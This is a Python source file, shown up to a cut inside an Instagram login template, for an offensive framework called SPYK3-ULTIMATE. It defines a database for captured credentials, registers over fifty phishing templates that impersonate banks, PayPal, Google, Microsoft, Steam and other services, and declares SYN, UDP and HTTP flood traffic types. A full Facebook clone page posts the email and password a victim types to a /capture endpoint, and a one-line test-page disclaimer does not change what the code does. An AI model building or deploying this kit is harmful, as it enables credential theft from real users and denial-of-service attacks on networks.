#!/usr/bin/env python3
"""
🔱 SPYK3-ULTIMATE vBOT 1.0.0 - Advanced Cybersecurity & Social Engineering Framework by Accurate Cyber Defense
===============================================================================================================
A comprehensive security toolkit combining:
- 50+ Phishing Templates (Social Media, E-commerce, Cloud Services, Gaming, Finance)
- 2000+ Security Commands
- Crunch Wordlist Generator with 7+ character sets
- SSH Remote Command Execution
- REAL Traffic Generation (ICMP, TCP, UDP, HTTP, DNS, ARP)
- Nikto Web Vulnerability Scanner
- Multi-platform Bots (Discord, Telegram, WhatsApp, Signal, Slack, iMessage)
- IP Management, Threat Detection & Reporting
- Metasploit-style Auxiliary Modules
- Session Management & Routing
- Workspace Organization
- Cyberpunk Blue/Green/Orange Theme Interface

Author: Security Research Tool
Version: 1.0.0
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import hashlib
import getpass
import socketserver
import argparse
import configparser
import csv
import pickle
import tempfile
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from cryptography.fernet import Fernet
from collections import defaultdict, Counter
from http.server import BaseHTTPRequestHandler

# =====================
# PLATFORM IMPORTS
# =====================

# Discord
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

# Telegram
try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

# WhatsApp (Selenium)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    SELENIUM_AVAILABLE = True
    try:
        from webdriver_manager.chrome import ChromeDriverManager
        WEBDRIVER_MANAGER_AVAILABLE = True
    except ImportError:
        WEBDRIVER_MANAGER_AVAILABLE = False
except ImportError:
    SELENIUM_AVAILABLE = False
    WEBDRIVER_MANAGER_AVAILABLE = False

# Slack
try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

# Scapy for advanced packet generation
try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, sr1, send, sendp, RandIP, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# QR Code generation
try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

# URL shortening
try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

# Paramiko for SSH
try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

# WHOIS
try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

# =====================
# COLOR THEME - CYBERPUNK BLUE/GREEN/ORANGE
# =====================
class Colors:
    """Cyberpunk color theme"""
    # Blue theme (main)
    BLUE1 = '\033[38;5;39m'
    BLUE2 = '\033[38;5;33m'
    BLUE3 = '\033[38;5;27m'
    CYAN = '\033[38;5;51m'
    
    # Green theme (success)
    GREEN1 = '\033[38;5;46m'
    GREEN2 = '\033[38;5;40m'
    GREEN3 = '\033[38;5;34m'
    
    # Orange theme (warnings)
    ORANGE1 = '\033[38;5;214m'
    ORANGE2 = '\033[38;5;208m'
    ORANGE3 = '\033[38;5;202m'
    
    # Accent colors
    PURPLE = '\033[38;5;93m'
    RED = '\033[38;5;196m'
    YELLOW = '\033[38;5;226m'
    WHITE = '\033[38;5;255m'
    GRAY = '\033[38;5;245m'
    
    # Background
    BG_BLUE = '\033[48;5;27m'
    BG_GREEN = '\033[48;5;34m'
    BG_ORANGE = '\033[48;5;202m'
    
    # Text styles
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".spyk3_ultimate"
DATABASE_FILE = os.path.join(CONFIG_DIR, "spyk3.db")
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
LOG_FILE = os.path.join(CONFIG_DIR, "spyk3.log")
PHISHING_TEMPLATES_DIR = os.path.join(CONFIG_DIR, "phishing_templates")
PHISHING_LOGS_DIR = os.path.join(CONFIG_DIR, "phishing_logs")
CAPTURED_CREDS_DIR = os.path.join(CONFIG_DIR, "credentials")
QR_CODES_DIR = os.path.join(CONFIG_DIR, "qrcodes")
PAYLOADS_DIR = os.path.join(CONFIG_DIR, "payloads")
WORKSPACES_DIR = os.path.join(CONFIG_DIR, "workspaces")
SCAN_RESULTS_DIR = os.path.join(CONFIG_DIR, "scans")
SESSION_DATA_DIR = os.path.join(CONFIG_DIR, "sessions")
NIKTO_RESULTS_DIR = os.path.join(CONFIG_DIR, "nikto_results")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
SSH_LOGS_DIR = os.path.join(CONFIG_DIR, "ssh_logs")
WORDLISTS_DIR = os.path.join(CONFIG_DIR, "wordlists")
CRUNCH_OUTPUT_DIR = os.path.join(CONFIG_DIR, "crunch_output")
REPORT_DIR = os.path.join(CONFIG_DIR, "reports")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")

# Platform config files
DISCORD_CONFIG_FILE = os.path.join(CONFIG_DIR, "discord_config.json")
TELEGRAM_CONFIG_FILE = os.path.join(CONFIG_DIR, "telegram_config.json")
WHATSAPP_CONFIG_FILE = os.path.join(CONFIG_DIR, "whatsapp_config.json")
SLACK_CONFIG_FILE = os.path.join(CONFIG_DIR, "slack_config.json")
SSH_CONFIG_FILE = os.path.join(CONFIG_DIR, "ssh_config.json")

# Create directories
directories = [
    CONFIG_DIR, PHISHING_TEMPLATES_DIR, PHISHING_LOGS_DIR, CAPTURED_CREDS_DIR,
    QR_CODES_DIR, PAYLOADS_DIR, WORKSPACES_DIR, SCAN_RESULTS_DIR, SESSION_DATA_DIR,
    NIKTO_RESULTS_DIR, TRAFFIC_LOGS_DIR, SSH_KEYS_DIR, SSH_LOGS_DIR, WORDLISTS_DIR,
    CRUNCH_OUTPUT_DIR, REPORT_DIR, WHATSAPP_SESSION_DIR
]
for directory in directories:
    Path(directory).mkdir(exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("Spyk3Ultimate")

# =====================
# ENUMS & DATA CLASSES
# =====================

class ScanType:
    QUICK = "quick"
    COMPREHENSIVE = "comprehensive"
    STEALTH = "stealth"
    VULNERABILITY = "vulnerability"
    FULL = "full"
    UDP = "udp"
    OS_DETECTION = "os_detection"
    SERVICE_DETECTION = "service_detection"
    WEB = "web"
    NIKTO = "nikto"

class TrafficType:
    ICMP = "icmp"
    TCP_SYN = "tcp_syn"
    TCP_ACK = "tcp_ack"
    TCP_CONNECT = "tcp_connect"
    UDP = "udp"
    HTTP_GET = "http_get"
    HTTP_POST = "http_post"
    HTTPS = "https"
    DNS = "dns"
    ARP = "arp"
    PING_FLOOD = "ping_flood"
    SYN_FLOOD = "syn_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    MIXED = "mixed"
    RANDOM = "random"

class Severity:
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

class CrunchPattern:
    LOWER = "lower"
    UPPER = "upper"
    MIXED = "mixed"
    NUMERIC = "numeric"
    ALPHANUM = "alphanum"
    SPECIAL = "special"
    HEX = "hex"

@dataclass
class PhishingLink:
    id: str
    platform: str
    platform_category: str
    phishing_url: str
    original_url: str
    template_name: str
    created_at: str
    clicks: int = 0
    captures: int = 0
    active: bool = True
    qr_code_path: Optional[str] = None
    short_url: Optional[str] = None
    notes: str = ""

@dataclass
class CapturedCredential:
    id: int
    link_id: str
    timestamp: str
    username: str
    password: str
    email: Optional[str] = None
    ip_address: Optional[str] = None
    user_agent: Optional[str] = None
    additional_data: Optional[str] = None

@dataclass
class SSHServer:
    id: str
    name: str
    host: str
    port: int
    username: str
    password: Optional[str] = None
    key_file: Optional[str] = None
    use_key: bool = False
    timeout: int = 30
    created_at: str = None
    last_used: Optional[str] = None
    status: str = "disconnected"
    notes: str = ""

@dataclass
class SSHCommandResult:
    success: bool
    output: str
    error: Optional[str] = None
    execution_time: float = 0.0
    server: str = ""
    command: str = ""

@dataclass
class TrafficGenerator:
    id: str
    traffic_type: str
    target_ip: str
    target_port: Optional[int]
    duration: int
    packet_rate: int
    packets_sent: int = 0
    bytes_sent: int = 0
    start_time: Optional[str] = None
    end_time: Optional[str] = None
    status: str = "pending"
    error: Optional[str] = None

@dataclass
class CrunchWordlist:
    id: str
    name: str
    filename: str
    min_length: int
    max_length: int
    charset: str
    pattern: str
    file_size: int
    line_count: int
    created_at: str
    status: str

@dataclass
class ThreatAlert:
    timestamp: str
    threat_type: str
    source_ip: str
    severity: str
    description: str
    action_taken: str

@dataclass
class ManagedIP:
    ip_address: str
    added_by: str
    added_date: str
    notes: str
    is_blocked: bool = False
    block_reason: Optional[str] = None
    blocked_date: Optional[str] = None
    alert_count: int = 0

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """SQLite database manager for all persistent storage"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_tables()
    
    def init_tables(self):
        """Initialize all database tables"""
        tables = [
            # Phishing tables
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                platform_category TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                original_url TEXT,
                template_name TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                captures INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                qr_code_path TEXT,
                short_url TEXT,
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                email TEXT,
                ip_address TEXT,
                user_agent TEXT,
                additional_data TEXT,
                FOREIGN KEY (link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_templates (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                platform TEXT NOT NULL,
                category TEXT NOT NULL,
                html_content TEXT,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP
            )
            """,
            # SSH tables
            """
            CREATE TABLE IF NOT EXISTS ssh_servers (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password TEXT,
                key_file TEXT,
                use_key BOOLEAN DEFAULT 0,
                timeout INTEGER DEFAULT 30,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP,
                status TEXT DEFAULT 'disconnected',
                notes TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                server_id TEXT NOT NULL,
                server_name TEXT,
                command TEXT NOT NULL,
                success BOOLEAN DEFAULT 1,
                output TEXT,
                error TEXT,
                execution_time REAL,
                executed_by TEXT,
                FOREIGN KEY (server_id) REFERENCES ssh_servers(id)
            )
            """,
            # Crunch tables
            """
            CREATE TABLE IF NOT EXISTS crunch_wordlists (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                filename TEXT NOT NULL,
                min_length INTEGER NOT NULL,
                max_length INTEGER NOT NULL,
                charset TEXT NOT NULL,
                pattern TEXT,
                file_size INTEGER DEFAULT 0,
                line_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'completed'
            )
            """,
            # Traffic logs
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                target_port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT,
                executed_by TEXT,
                error TEXT
            )
            """,
            # Threats
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT,
                action_taken TEXT,
                resolved BOOLEAN DEFAULT 0
            )
            """,
            # Managed IPs
            """
            CREATE TABLE IF NOT EXISTS managed_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                added_by TEXT,
                added_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                notes TEXT,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                blocked_date TIMESTAMP,
                alert_count INTEGER DEFAULT 0,
                last_scan TIMESTAMP,
                scan_count INTEGER DEFAULT 0
            )
            """,
            # Workspaces
            """
            CREATE TABLE IF NOT EXISTS workspaces (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 0
            )
            """,
            # Hosts
            """
            CREATE TABLE IF NOT EXISTS hosts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                workspace_id INTEGER,
                ip_address TEXT NOT NULL,
                hostname TEXT,
                os_info TEXT,
                mac_address TEXT,
                vendor TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                notes TEXT,
                FOREIGN KEY (workspace_id) REFERENCES workspaces(id),
                UNIQUE(workspace_id, ip_address)
            )
            """,
            # Services
            """
            CREATE TABLE IF NOT EXISTS services (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                host_id INTEGER,
                port INTEGER NOT NULL,
                protocol TEXT,
                service_name TEXT,
                service_version TEXT,
                state TEXT,
                banner TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                FOREIGN KEY (host_id) REFERENCES hosts(id),
                UNIQUE(host_id, port, protocol)
            )
            """,
            # Command history
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            # Platform status
            """
            CREATE TABLE IF NOT EXISTS platform_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                platform TEXT UNIQUE NOT NULL,
                enabled BOOLEAN DEFAULT 0,
                last_connected TIMESTAMP,
                status TEXT,
                error TEXT
            )
            """,
            # Nikto scans
            """
            CREATE TABLE IF NOT EXISTS nikto_scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                vulnerabilities TEXT,
                output_file TEXT,
                scan_time REAL,
                success BOOLEAN DEFAULT 1
            )
            """,
            # Stats
            """
            CREATE TABLE IF NOT EXISTS platform_categories (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                description TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_stats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                date DATE UNIQUE,
                total_links INTEGER DEFAULT 0,
                total_clicks INTEGER DEFAULT 0,
                total_captures INTEGER DEFAULT 0
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
        self._init_platform_categories()
        self._init_phishing_templates()
        self.create_default_workspace()
    
    def _init_platform_categories(self):
        """Initialize platform categories"""
        categories = [
            ("social_media", "Social Media Platforms - Facebook, Instagram, Twitter, LinkedIn, etc."),
            ("ecommerce", "E-commerce & Shopping - Amazon, eBay, Walmart, etc."),
            ("cloud", "Cloud & Productivity - Google, Microsoft, Dropbox, etc."),
            ("gaming", "Gaming Platforms - Steam, Epic Games, Roblox, etc."),
            ("finance", "Financial Services - PayPal, Banks, etc."),
            ("email", "Email Services - Gmail, Outlook, Yahoo, etc."),
            ("streaming", "Media Streaming - Netflix, Spotify, Hulu, etc."),
            ("creative", "Creative Tools - Adobe, Canva, Figma, etc."),
            ("other", "Other Services")
        ]
        
        for name, desc in categories:
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO platform_categories (name, description)
                    VALUES (?, ?)
                ''', (name, desc))
            except Exception as e:
                logger.error(f"Failed to insert category {name}: {e}")
        
        self.conn.commit()
    
    def _init_phishing_templates(self):
        """Initialize all 50+ phishing templates"""
        templates = self._get_all_templates()
        
        for name, template in templates.items():
            try:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO phishing_templates 
                    (name, platform, category, html_content, description)
                    VALUES (?, ?, ?, ?, ?)
                ''', (name, template['platform'], template['category'], 
                      template['html'], template['description']))
            except Exception as e:
                logger.error(f"Failed to insert template {name}: {e}")
        
        self.conn.commit()
    
    def _get_all_templates(self) -> Dict:
        """Get all 50+ phishing templates"""
        templates = {}
        
        # ==================== SOCIAL MEDIA ====================
        templates.update({
            "facebook_classic": {
                "platform": "Facebook",
                "category": "social_media",
                "html": self._get_facebook_template(),
                "description": "Classic Facebook login page"
            },
            "instagram_classic": {
                "platform": "Instagram",
                "category": "social_media",
                "html": self._get_instagram_template(),
                "description": "Instagram login with phone/email/username"
            },
            "instagram_followers": {
                "platform": "Instagram",
                "category": "social_media",
                "html": self._get_instagram_followers_template(),
                "description": "Instagram fake followers generator page"
            },
            "twitter_x": {
                "platform": "Twitter (X)",
                "category": "social_media",
                "html": self._get_twitter_template(),
                "description": "Twitter/X login page"
            },
            "linkedin_login": {
                "platform": "LinkedIn",
                "category": "social_media",
                "html": self._get_linkedin_template(),
                "description": "LinkedIn professional login"
            },
            "snapchat_login": {
                "platform": "Snapchat",
                "category": "social_media",
                "html": self._get_snapchat_template(),
                "description": "Snapchat login interface"
            },
            "tiktok_login": {
                "platform": "TikTok",
                "category": "social_media",
                "html": self._get_tiktok_template(),
                "description": "TikTok login page"
            },
            "reddit_login": {
                "platform": "Reddit",
                "category": "social_media",
                "html": self._get_reddit_template(),
                "description": "Reddit login page"
            },
            "discord_login": {
                "platform": "Discord",
                "category": "social_media",
                "html": self._get_discord_template(),
                "description": "Discord login page"
            },
            "pinterest_login": {
                "platform": "Pinterest",
                "category": "social_media",
                "html": self._get_pinterest_template(),
                "description": "Pinterest login page"
            },
            "badoo_login": {
                "platform": "Badoo",
                "category": "social_media",
                "html": self._get_badoo_template(),
                "description": "Badoo dating service login"
            },
        })
        
        # ==================== E-COMMERCE ====================
        templates.update({
            "amazon_login": {
                "platform": "Amazon",
                "category": "ecommerce",
                "html": self._get_amazon_template(),
                "description": "Amazon login page"
            },
            "ebay_login": {
                "platform": "eBay",
                "category": "ecommerce",
                "html": self._get_ebay_template(),
                "description": "eBay sign-in page"
            },
            "walmart_login": {
                "platform": "Walmart",
                "category": "ecommerce",
                "html": self._get_walmart_template(),
                "description": "Walmart login page"
            },
            "target_login": {
                "platform": "Target",
                "category": "ecommerce",
                "html": self._get_target_template(),
                "description": "Target login page"
            },
            "bestbuy_login": {
                "platform": "Best Buy",
                "category": "ecommerce",
                "html": self._get_bestbuy_template(),
                "description": "Best Buy login page"
            },
            "aliexpress_login": {
                "platform": "AliExpress",
                "category": "ecommerce",
                "html": self._get_aliexpress_template(),
                "description": "AliExpress login page"
            },
            "etsy_login": {
                "platform": "Etsy",
                "category": "ecommerce",
                "html": self._get_etsy_template(),
                "description": "Etsy login page"
            },
            "shopify_login": {
                "platform": "Shopify",
                "category": "ecommerce",
                "html": self._get_shopify_template(),
                "description": "Shopify store login"
            },
        })
        
        # ==================== CLOUD & PRODUCTIVITY ====================
        templates.update({
            "google_general": {
                "platform": "Google",
                "category": "cloud",
                "html": self._get_google_template(),
                "description": "Google account login"
            },
            "google_gmail": {
                "platform": "Gmail",
                "category": "email",
                "html": self._get_gmail_template(),
                "description": "Gmail-specific login"
            },
            "microsoft_login": {
                "platform": "Microsoft",
                "category": "cloud",
                "html": self._get_microsoft_template(),
                "description": "Microsoft account login"
            },
            "outlook_login": {
                "platform": "Outlook",
                "category": "email",
                "html": self._get_outlook_template(),
                "description": "Outlook email login"
            },
            "yahoo_login": {
                "platform": "Yahoo",
                "category": "email",
                "html": self._get_yahoo_template(),
                "description": "Yahoo mail login"
            },
            "protonmail_login": {
                "platform": "ProtonMail",
                "category": "email",
                "html": self._get_protonmail_template(),
                "description": "ProtonMail secure email login"
            },
            "github_login": {
                "platform": "GitHub",
                "category": "cloud",
                "html": self._get_github_template(),
                "description": "GitHub developer login"
            },
            "dropbox_login": {
                "platform": "Dropbox",
                "category": "cloud",
                "html": self._get_dropbox_template(),
                "description": "Dropbox file hosting login"
            },
            "onedrive_login": {
                "platform": "OneDrive",
                "category": "cloud",
                "html": self._get_onedrive_template(),
                "description": "Microsoft OneDrive login"
            },
            "box_login": {
                "platform": "Box",
                "category": "cloud",
                "html": self._get_box_template(),
                "description": "Box cloud storage login"
            },
            "wordpress_login": {
                "platform": "WordPress",
                "category": "cloud",
                "html": self._get_wordpress_template(),
                "description": "WordPress CMS login"
            },
        })
        
        # ==================== GAMING ====================
        templates.update({
            "steam_login": {
                "platform": "Steam",
                "category": "gaming",
                "html": self._get_steam_template(),
                "description": "Steam gaming platform login"
            },
            "epicgames_login": {
                "platform": "Epic Games",
                "category": "gaming",
                "html": self._get_epicgames_template(),
                "description": "Epic Games Store login"
            },
            "roblox_login": {
                "platform": "Roblox",
                "category": "gaming",
                "html": self._get_roblox_template(),
                "description": "Roblox gaming platform login"
            },
            "minecraft_login": {
                "platform": "Minecraft",
                "category": "gaming",
                "html": self._get_minecraft_template(),
                "description": "Minecraft/Mojang login"
            },
            "origin_login": {
                "platform": "Origin",
                "category": "gaming",
                "html": self._get_origin_template(),
                "description": "EA Origin gaming login"
            },
            "ubisoft_login": {
                "platform": "Ubisoft",
                "category": "gaming",
                "html": self._get_ubisoft_template(),
                "description": "Ubisoft Connect login"
            },
            "battlenet_login": {
                "platform": "Battle.net",
                "category": "gaming",
                "html": self._get_battlenet_template(),
                "description": "Blizzard Battle.net login"
            },
            "twitch_login": {
                "platform": "Twitch",
                "category": "streaming",
                "html": self._get_twitch_template(),
                "description": "Twitch gaming streaming login"
            },
        })
        
        # ==================== STREAMING ====================
        templates.update({
            "netflix_login": {
                "platform": "Netflix",
                "category": "streaming",
                "html": self._get_netflix_template(),
                "description": "Netflix streaming login"
            },
            "spotify_login": {
                "platform": "Spotify",
                "category": "streaming",
                "html": self._get_spotify_template(),
                "description": "Spotify music login"
            },
            "hulu_login": {
                "platform": "Hulu",
                "category": "streaming",
                "html": self._get_hulu_template(),
                "description": "Hulu streaming login"
            },
            "disneyplus_login": {
                "platform": "Disney+",
                "category": "streaming",
                "html": self._get_disneyplus_template(),
                "description": "Disney+ streaming login"
            },
            "hbomax_login": {
                "platform": "HBO Max",
                "category": "streaming",
                "html": self._get_hbomax_template(),
                "description": "HBO Max login"
            },
            "peacock_login": {
                "platform": "Peacock",
                "category": "streaming",
                "html": self._get_peacock_template(),
                "description": "NBC Peacock login"
            },
            "paramount_login": {
                "platform": "Paramount+",
                "category": "streaming",
                "html": self._get_paramount_template(),
                "description": "Paramount+ login"
            },
        })
        
        # ==================== FINANCE ====================
        templates.update({
            "paypal_login": {
                "platform": "PayPal",
                "category": "finance",
                "html": self._get_paypal_template(),
                "description": "PayPal payment login"
            },
            "venmo_login": {
                "platform": "Venmo",
                "category": "finance",
                "html": self._get_venmo_template(),
                "description": "Venmo payment login"
            },
            "cashapp_login": {
                "platform": "Cash App",
                "category": "finance",
                "html": self._get_cashapp_template(),
                "description": "Cash App login"
            },
            "chase_login": {
                "platform": "Chase",
                "category": "finance",
                "html": self._get_chase_template(),
                "description": "Chase Bank login"
            },
            "wellsfargo_login": {
                "platform": "Wells Fargo",
                "category": "finance",
                "html": self._get_wellsfargo_template(),
                "description": "Wells Fargo login"
            },
            "bankofamerica_login": {
                "platform": "Bank of America",
                "category": "finance",
                "html": self._get_bofa_template(),
                "description": "Bank of America login"
            },
        })
        
        # ==================== CREATIVE ====================
        templates.update({
            "adobe_login": {
                "platform": "Adobe",
                "category": "creative",
                "html": self._get_adobe_template(),
                "description": "Adobe ID login with Creative Cloud"
            },
            "canva_login": {
                "platform": "Canva",
                "category": "creative",
                "html": self._get_canva_template(),
                "description": "Canva design platform login"
            },
            "figma_login": {
                "platform": "Figma",
                "category": "creative",
                "html": self._get_figma_template(),
                "description": "Figma design tool login"
            },
        })
        
        # ==================== CUSTOM ====================
        templates.update({
            "custom_generic": {
                "platform": "Custom",
                "category": "other",
                "html": self._get_custom_template(),
                "description": "Generic login page template"
            },
            "custom_modern": {
                "platform": "Modern",
                "category": "other",
                "html": self._get_modern_template(),
                "description": "Modern minimalist login page"
            },
            "custom_corporate": {
                "platform": "Corporate",
                "category": "other",
                "html": self._get_corporate_template(),
                "description": "Corporate VPN login style"
            },
        })
        
        return templates
    
    # ==================== TEMPLATE HTML METHODS ====================
    
    def _get_facebook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Facebook - log in or sign up</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 980px; width: 100%; display: flex; flex-wrap: wrap; justify-content: space-between; align-items: center; gap: 40px; }
        .left-section { flex: 1; min-width: 300px; padding: 20px; }
        .left-section h1 { color: #1877f2; font-size: 60px; font-weight: 700; margin-bottom: 10px; }
        .left-section p { font-size: 28px; line-height: 32px; color: #1c1e21; font-weight: normal; }
        .right-section { flex: 1; min-width: 396px; }
        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px 16px 28px; width: 100%; }
        .form-group { margin-bottom: 12px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; background: #fff; transition: border-color .2s; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
        button { width: 100%; padding: 12px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: 600; cursor: pointer; transition: background .2s; }
        button:hover { background: #166fe5; }
        .forgot-link { text-align: center; margin: 16px 0; }
        .forgot-link a { color: #1877f2; font-size: 14px; font-weight: 500; text-decoration: none; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-account { text-align: center; }
        .create-account button { background: #42b72a; font-size: 17px; width: auto; padding: 12px 16px; display: inline-block; }
        .create-account button:hover { background: #36a420; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
        @media (max-width: 900px) { .container { flex-direction: column; text-align: center; } .left-section h1 { font-size: 40px; } .left-section p { font-size: 20px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <h1>facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right-section">
            <div class="login-box">
                <form method="POST" action="/capture">
                    <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                    <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                    <button type="submit">Log In</button>
                    <div class="forgot-link"><a href="#">Forgot password?</a></div>
                </form>
                <div class="divider"></div>
                <div class="create-account"><button onclick="window.location.href='#'">Create new account</button></div>
            </div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_instagram_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Instagram • Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
